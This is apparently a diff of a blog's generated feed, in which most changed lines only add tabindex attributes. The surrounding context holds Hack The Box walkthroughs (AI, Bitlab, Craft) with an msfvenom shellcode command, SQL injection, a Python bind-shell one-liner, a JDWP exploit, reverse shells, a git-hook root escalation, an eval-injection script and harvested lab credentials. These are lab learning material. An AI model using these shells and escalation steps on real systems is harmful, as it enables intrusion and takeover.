-<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/msfvenom
+<pre tabindex="0"><code class="language-console" data-lang="console">/usr/share/metasploit-framework/msfvenom
 /usr/bin/msfvenom
 </code></pre><h3 id="shellcode-poc-calcexe">Shellcode POC: calc.exe</h3>
-<pre><code class="language-console" data-lang="console">msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
+<pre tabindex="0"><code class="language-console" data-lang="console">msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
 </code></pre>]]></content></item><item><title>Hack The Box - AI</title><link>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</link><pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</guid><description>Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
 This was a box where for the foothold, you needed to upload a .</description><content type="html"><![CDATA[
     <img src="/images/htb/ai/info-card.png"  class="center"  style="border-radius: 8px;"  />
@@ -1493,7 +1572,7 @@ At the time I did this box, I was only documenting with screenshots, so some dat
 <p>Said that, time to get our hands dirty.</p>
 <h2 id="nmap">Nmap</h2>
 <p>As always the enumeration starts by running Nmap:</p>
-<pre><code class="language-console" data-lang="console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
+<pre tabindex="0"><code class="language-console" data-lang="console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
 Nmap scan report for ai.htb (10.10.10.163)
 Host is up (0.019s latency).
 Not shown: 998 closed ports
@@ -1555,7 +1634,7 @@ Some enumeration of it is carried.</p>
 
 <h2 id="foothold">Foothold</h2>
 <p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -1592,7 +1671,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 
 
 <p>getting as final SQL Injection the next:</p>
-<pre><code>User:
+<pre tabindex="0"><code>User:
 Open single quote union select, username from users Comment Database
 Password:
 Open single quote union select, password from users Comment Database
@@ -1606,10 +1685,10 @@ Open single quote union select, password from users Comment Database
 
 
 <p>Then, was tried to login via ssh with the credentials:</p>
-<pre><code>user: alexa
+<pre tabindex="0"><code>user: alexa
 passwd: H,Sq9t6}a&lt;)?q93_
 </code></pre><p>Getting a success:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
 alexa@10.10.10.163's password: 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
 
@@ -1640,7 +1719,7 @@ alexa@AI:~$ wc -c user.txt
 33 user.txt
 </code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
 <p>When is checked which net. services are listening, was found :8080:</p>
-<pre><code class="language-console" data-lang="console">alexa@AI:~$ ss -punta
+<pre tabindex="0"><code class="language-console" data-lang="console">alexa@AI:~$ ss -punta
 Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
 :Port                 
 udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
@@ -1671,12 +1750,12 @@ tcp                 TIME-WAIT                0                     0            
 
 
 <p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html">JDWP</a> enabled:</p>
-<pre><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+<pre tabindex="0"><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
 </code></pre><p>A quick search google gives a result the next <a href="https://www.exploit-db.com/exploits/46501">exploit</a></p>
 <p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
 </code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>
-<pre><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
+<pre tabindex="0"><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
 [+] Targeting '127.0.0.1:8000'
 [+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
 [+] Found Runtime class: id=650
@@ -1691,7 +1770,7 @@ tcp                 TIME-WAIT                0                     0            
 [+] Runtime.exec() successful, retId=6f0
 [!] Command successfully executed
 </code></pre><p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
 ai.lnx.htb [10.10.10.163] 2222 (?) open
 bash: cannot set terminal process group (6086): Inappropriate ioctl for device
 bash: no job control in this shell
@@ -1710,7 +1789,7 @@ wc -c /root/root.txt
 <p>Said that, let&rsquo;s get our hands dirty :D</p>
 <h2 id="nmap">Nmap</h2>
 <p>We start running nmap to get which ports/services are being exposed:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
 Nmap scan report for bitlab.htb (10.10.10.114)
 Host is up (0.019s latency).
@@ -1801,7 +1880,7 @@ $branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672"
 
 <p>Now we know that indeed that the mentioned url above will be the one wee need to use.
 We run the listener for our reverse shell and execute it, with it having our rce:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
 Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
@@ -1814,7 +1893,7 @@ www-data@bitlab:/var/www$ pwd
 pwd
 /var/www
 </code></pre><p>We check if we have sudo rights, where is the home of www-data and what we found there:</p>
-<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www$ sudo -l
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@bitlab:/var/www$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on bitlab:
     env_reset, exempt_group=sudo, mail_badpass,
@@ -1840,7 +1919,7 @@ drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
 -rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
 </code></pre><p>So far we know that the repos of git are under <code>/var/www/html/</code> and that we are allowed to do a git pull with sudo rights inside the repos, this is what we will be using to get root by taking advantage of the webhooks enabled in gitlab (post-merge hook) and the ability to run git pull with root rights (<code>git pull</code> is like git fetch and git merge in one for saying it in a way), for understanding how these 2 things work, jump into the documentation of <a href="https://git-scm.com/docs/githooks#_post_merge">hooks: post merge</a> and the one for <a href="https://git-scm.com/docs/git-pull">git pull</a>.</p>
 <p>Our repo doesn&rsquo;t allow us to edit files there, so we copy the repo to a place where we have them:</p>
-<pre><code class="language-console" data-lang="console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
 cp -r profile /tmp/profile
 www-data@bitlab:/tmp/profile$ ls -la
 ls -la
@@ -1856,14 +1935,14 @@ drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
 drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
 -rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
 </code></pre><p>We create a script named as <code>post-merge</code> inside <code>.git/hooks</code> to get a shell as root and give to it execution rights:</p>
-<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ cd .git/hooks
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ cd .git/hooks
 cd .git/hooks
 www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
 &lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
 www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
 chmod u+x post-merge
 </code></pre><p>Once that is done, we upload any file (doesn&rsquo;t matter) to gitlab and merge it, once that is done from inside this location we have rights, we run <code>sudo git pull</code> and with that we will be root:</p>
-<pre><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ sudo git pull
+<pre tabindex="0"><code class="language-console" data-lang="console">www-data@bitlab:/tmp/profile$ sudo git pull
 sudo git pull
 remote: Enumerating objects: 4, done.
 remote: Counting objects: 100% (4/4), done.
@@ -1914,7 +1993,7 @@ wc -c root.txt
 </code></pre></div><p>After save and merge of it, we go to <code>http://10.10.10.114/profile/&lt;name you give to the script&gt;</code>, and we should get as a result printed an array with our previous user <code>clave</code> and a password:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Array ( [<span style="color:#ae81ff">0</span>] =&gt; Array ( [<span style="color:#a6e22e">id</span>] =&gt; <span style="color:#ae81ff">1</span> [<span style="color:#a6e22e">username</span>] =&gt; <span style="color:#a6e22e">clave</span> [<span style="color:#a6e22e">password</span>] =&gt; <span style="color:#a6e22e">c3NoLXN0cjBuZy1wQHNz</span><span style="color:#f92672">==</span> ) )
 </code></pre></div><p>Before trying to crack the password, we try to use as it is, and indeed it was just that one it was not encrypted!</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
 clave@10.10.10.114's password: 
 Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
 clave@bitlab:~$ id
@@ -1946,7 +2025,7 @@ Today was just retired Craft from Hack the box, this was a really fun box to do,
 <p>Said that, let&rsquo;s start with the real write up!</p>
 <h2 id="nmap">Nmap</h2>
 <p>We start running nmap to scan for open ports and services:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
 Nmap scan report for 10.10.10.110
 Host is up (0.082s latency).
@@ -2047,7 +2126,7 @@ Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
 <h2 id="rce">RCE</h2>
 <p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
 I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 import requests
@@ -2066,8 +2145,8 @@ payload = {&quot;name&quot;:&quot;foo&quot;,&quot;brewer&quot;:&quot;foo&quot;, 
 payload = json.dumps(payload)
 attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
 </code></pre><p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
-</code></pre><pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
+</code></pre><pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
 /bin/sh: can't access tty; job control turned off
@@ -2076,7 +2155,7 @@ root
 /opt/app # id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 </code></pre><p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # cd /root
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # cd /root
 /root # ls -la
 total 12
 drwx------    1 root     root          4096 Feb  9  2019 .
@@ -2084,7 +2163,7 @@ drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
 drwx------    1 root     root          4096 Feb  9  2019 .cache
 /root # 
 </code></pre><p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p>
-<pre><code class="language-console" data-lang="console">/opt/app # ls -la /
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # ls -la /
 total 64
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
@@ -2140,7 +2219,7 @@ lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
 lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
 </code></pre><p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # ls -la
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # ls -la
 total 32
 drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
 drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
@@ -2162,7 +2241,7 @@ craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
 dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
 /opt/app # 
 </code></pre><p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # cat dbtest.py
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # cat dbtest.py
 #!/usr/bin/env python
 
 import pymysql
@@ -2192,10 +2271,10 @@ finally:
 
 
 So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
 /opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
 </code></pre><p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p>
-<pre><code class="language-console" data-lang="console">/opt/app # python dbtest.py
+<pre tabindex="0"><code class="language-console" data-lang="console">/opt/app # python dbtest.py
 [{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
 /opt/app # sed -i 's/sql \= \&quot;show tables\&quot;/sql \= \&quot;SELECT * FROM user\&quot;/' dbtest.py
 /opt/app # python dbtest.py
@@ -2216,7 +2295,7 @@ So, I change the script to do a <code>show tables</code> using <code>fetchall()<
 
 
 <p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p>
-<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
+<pre tabindex="0"><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa
 
 
   .   *   ..  . *  *
@@ -2251,7 +2330,7 @@ gilfoyle@craft:~$ wc -c user.txt
 33 user.txt
 </code></pre><h2 id="root">root</h2>
 <p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href="https://www.vaultproject.io/">Vault project page</a>), and try to login to vault with it which goes well.</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token 
+<pre tabindex="0"><code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token 
 f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
 Token (will be hidden): 
 Success! You are now authenticated. The token information displayed below
@@ -2274,7 +2353,7 @@ gilfoyle@craft:~$
 
 
 with this information we run vault to get the kv if the secret is indeed there:</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
+<pre tabindex="0"><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
 ========== Data ==========
 Key                  Value
 ---                  -----
@@ -2286,7 +2365,7 @@ key_type             otp
 port                 22
 </code></pre><p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href="https://en.wikipedia.org/wiki/One-time_password">One-Time Password</a>)
 We check what options vault provides to use it:</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
+<pre tabindex="0"><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
 Usage: vault &lt;command&gt; [args]
 
 Common commands:
@@ -2341,7 +2420,7 @@ Usage: vault ssh [options] username@ip [ssh options]
 
   For the full list of options and arguments, please see the documentation.
 </code></pre><p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p>
-<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
+<pre tabindex="0"><code class="language-console" data-lang="console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
 Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
 below. Enter this code in the SSH password prompt. If you install sshpass,
 Vault can automatically perform this step for you.
